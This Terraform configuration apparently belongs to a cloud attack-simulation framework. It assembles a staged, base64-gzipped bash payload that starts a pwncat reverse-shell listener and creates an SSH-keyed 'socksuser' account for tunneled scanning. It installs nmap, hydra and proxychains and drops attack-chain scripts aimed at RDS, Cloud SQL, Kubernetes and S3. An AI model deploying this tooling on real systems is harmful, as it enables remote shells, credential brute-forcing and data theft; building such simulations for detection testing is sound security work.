locals {
    listen_port = var.inputs["listen_port"]
    listen_ip = var.inputs["listen_ip"]
    attack_dir = "/pwncat"
    payload = <<-EOT
    PWNCAT_LOG="/tmp/pwncat.log"
    PWNCAT_SESSION="pwncat"
    PWNCAT_SESSION_LOCK="/tmp/pwncat_session.lock"
    if [ -e "$PWNCAT_SESSION_LOCK" ]  && screen -ls | grep -q "$PWNCAT_SESSION"; then
        log "Pwncat session lock $PWNCAT_SESSION_LOCK exists and pwncat screen session running. Skipping setup."
    else
        rm -f "$PWNCAT_SESSION_LOCK"
        log "Session lock doesn't exist and screen session not runing. Continuing..."
        log "setting up reverse shell listener: ${local.listen_ip}:${local.listen_port}"
        screen -S $PWNCAT_SESSION -X quit
        screen -wipe
        log "cleaning app directory"
        rm -rf ${local.attack_dir}
        mkdir -p ${local.attack_dir}/plugins ${local.attack_dir}/resources
        cd ${local.attack_dir}
        echo ${base64gzip(local.listener)} | base64 -d | gunzip > listener.py
        echo ${base64gzip(local.responder)} | base64 -d | gunzip > plugins/responder.py
        echo ${base64gzip(local.instance2rds)} | base64 -d | gunzip > resources/instance2rds.sh
        echo ${base64gzip(local.iam2rds)} | base64 -d | gunzip > resources/iam2rds.sh
        echo ${base64gzip(local.azureiam2azuresql)} | base64 -d | gunzip > resources/azureiam2azuresql.sh
        echo ${base64gzip(local.gcpiam2cloudsql)} | base64 -d | gunzip > resources/gcpiam2cloudsql.sh
        echo ${base64gzip(local.scan2kubeshell)} | base64 -d | gunzip > resources/scan2kubeshell.sh
        echo ${base64gzip(local.kube2s3)} | base64 -d | gunzip > resources/kube2s3.sh 
        echo ${base64gzip(local.iam2enum)} | base64 -d | gunzip > resources/iam2enum.sh
        log "installing required python3.9..."
        apt-get install -y python3.9 python3.9-venv >> $LOGFILE 2>&1
        curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
        python3.9 get-pip.py >> $LOGFILE 2>&1
        log "wait before using module..."
        sleep 5
        python3.9 -m pip install -U pip "packaging>=24" "ordered-set>=3.1.1" "more_itertools>=8.8" "jaraco.text>=3.7" "importlib_resources>=5.10.2" "importlib_metadata>=6" "tomli>=2.0.1" "wheel>=0.43.0" "platformdirs>=2.6.2" setuptools wheel setuptools_rust jinja2 jc >> $LOGFILE 2>&1
        python3.9 -m pip install -U pwncat-cs >> $LOGFILE 2>&1
        log "wait before using module..."
        sleep 5
        if ! [ -e /home/socksuser/.ssh/socksuser_key ]; then
            log "adding tunneled port scanning user - socksuser..."
            adduser --gecos "" --disabled-password "socksuser" || log "socksuser user already exists"
            log "adding ssh keys for socks user..."
            mkdir -p /home/socksuser/.ssh 2>&1 | tee -a $LOGFILE
            ssh-keygen -t rsa -N '' -b 4096 -f /home/socksuser/.ssh/socksuser_key 2>&1 | tee -a $LOGFILE
            cat /home/socksuser/.ssh/socksuser_key.pub >> /home/socksuser/.ssh/authorized_keys 2>&1 | tee -a $LOGFILE
            chown -R socksuser:socksuser /home/socksuser
            chmod 600 /home/socksuser/.ssh/authorized_keys 2>&1 | tee -a $LOGFILE
            log "socksuser setup complete..."
        fi
        START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
        while true; do
            for i in `seq $((MAXLOG-1)) -1 1`; do mv "$PWNCAT_LOG."{$i,$((i+1))} 2>/dev/null || true; done
            mv $PWNCAT_LOG "$PWNCAT_LOG.1" 2>/dev/null || true
            log "starting background process via screen..."
            screen -S $PWNCAT_SESSION -X quit
            screen -wipe
            screen -d -L -Logfile $PWNCAT_LOG -S $PWNCAT_SESSION -m /bin/bash -c "cd ${local.attack_dir} && python3.9 listener.py --port=\"${var.inputs["reverse_shell_port"]}\" --host=\"${var.inputs["reverse_shell_host"]}\" --payload=\"${var.inputs["payload"]}\""
            screen -S $PWNCAT_SESSION -X colon "logfile flush 0^M"
            log "Checking for listener..."
            TIMEOUT=1800
            START_TIME=$(date +%s)
            while true; do
                CURRENT_TIME=$(date +%s)
                ELAPSED_TIME=$((CURRENT_TIME - START_TIME))
                if grep "listener created" $PWNCAT_LOG; then
                    log "Found listener created log in $PWNCAT_LOG - checking for port response"
                    while ! nc -z -w 5 -vv 127.0.0.1 ${local.listen_port} > /dev/null; do
                        log "failed check - waiting for pwncat port response: 127.0.0.1:${local.listen_port}";
                        sleep 30;
                        if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
                            log "payload update detected - exiting loop and forcing payload download"
                            rm -f /tmp/payload_$SCRIPTNAME
                            break 3
                        fi
                    done;
                    log "Sucessfully connected to 127.0.0.1:${local.listen_port}"
                    break
                fi
                if [ $ELAPSED_TIME -gt $TIMEOUT ]; then
                    log "Failed to find listener created log for pwncat - timeout after $TIMEOUT seconds"
                    exit 1
                fi
            done
            log "responder started."
            log "starting sleep for 30 minutes - blocking new tasks while accepting connections..."
            sleep 1800
            log "sleep complete - checking for running sessions..."
            while [ -e "$PWNCAT_SESSION_LOCK" ]  && screen -ls | grep -q "$PWNCAT_SESSION"; do
                log "pwncat session still running - waiting before restart..."
                sleep 600
            done
            log "no pwncat sessions found - continuing..."
            if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
                log "payload update detected - exiting loop and forcing payload download"
                rm -f /tmp/payload_$SCRIPTNAME
                break
            else
                log "restarting loop..."
            fi
        done
    fi
    log "done."
    EOT

    listener        = file("${path.module}/resources/listener.py")
    responder       = file("${path.module}/resources/responder.py")
    instance2rds    = templatefile(
                                "${path.module}/resources/instance2rds.sh", 
                                {
                                    region = var.inputs["region"],
                                    environment = var.inputs["environment"],
                                    deployment = var.inputs["deployment"]
                                }
                            )

    iam2rds         = templatefile(
                                "${path.module}/resources/iam2rds.sh", 
                                {
                                    region = var.inputs["region"],
                                    environment = var.inputs["environment"],
                                    deployment = var.inputs["deployment"],
                                    iam2rds_role_name = var.inputs["iam2rds_role_name"]
                                    iam2rds_session_name = "${var.inputs["iam2rds_session_name"]}-${var.inputs["deployment"]}"
                                }
                            )
    
    iam2enum = file("${path.module}/resources/iam2enum.sh")
                            
    azureiam2azuresql = file("${path.module}/resources/azureiam2azuresql.sh")                            

    gcpiam2cloudsql = file("${path.module}/resources/gcpiam2cloudsql.sh")

    scan2kubeshell = file("${path.module}/resources/scan2kubeshell.sh")
    
    kube2s3 = file("${path.module}/resources/kube2s3.sh")

    base64_payload = templatefile("${path.module}/../../delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = "proxychains4 nmap hydra python3-pip"
        apt_post_tasks = ""
        yum_pre_tasks =  <<-EOT
        if ! command -v proxychains4 > /dev/null || ! command -v hydra > /dev/null || ! command -v hydra > /dev/null; then
            yum update -y
            yum install -y git
            yum groupinstall -y 'Development Tools'
            # proxychains4
            cd /usr/local/src
            git clone https://github.com/rofl0r/proxychains-ng
            cd proxychains-ng
            ./configure && make && make install
            make install-config
            # hydra
            cd /usr/local/src
            git clone https://github.com/vanhauser-thc/thc-hydra
            cd thc-hydra
            ./configure && make && make install
        fi
        EOT
        yum_packages = "nmap python3-pip"
        yum_post_tasks = ""
        script_delay_secs = 30
        next_stage_payload = local.payload
    }})

    outputs = {
        base64_payload = base64gzip(local.base64_payload)
        base64_uncompressed_payload = base64encode(local.base64_payload)
        base64_uncompressed_payload_additional = [
            {
                name = "${basename(abspath(path.module))}_instance2rds.sh"
                content = base64encode(local.instance2rds)
            },
            {
                name = "${basename(abspath(path.module))}_iam2rds.sh"
                content = base64encode(local.iam2rds)
            },
            {
                name = "${basename(abspath(path.module))}_scan2kubeshell.sh"
                content = base64encode(local.scan2kubeshell)
            },
            {
                name = "${basename(abspath(path.module))}_kube2s3.sh"
                content = base64encode(local.kube2s3)
            },
            {
                name = "${basename(abspath(path.module))}_gcpiam2cloudsql.sh"
                content = base64encode(local.gcpiam2cloudsql)
            },
            {
                name = "${basename(abspath(path.module))}_iam2enum.sh"
                content = base64encode(local.iam2enum)
            }
        ]
    }
}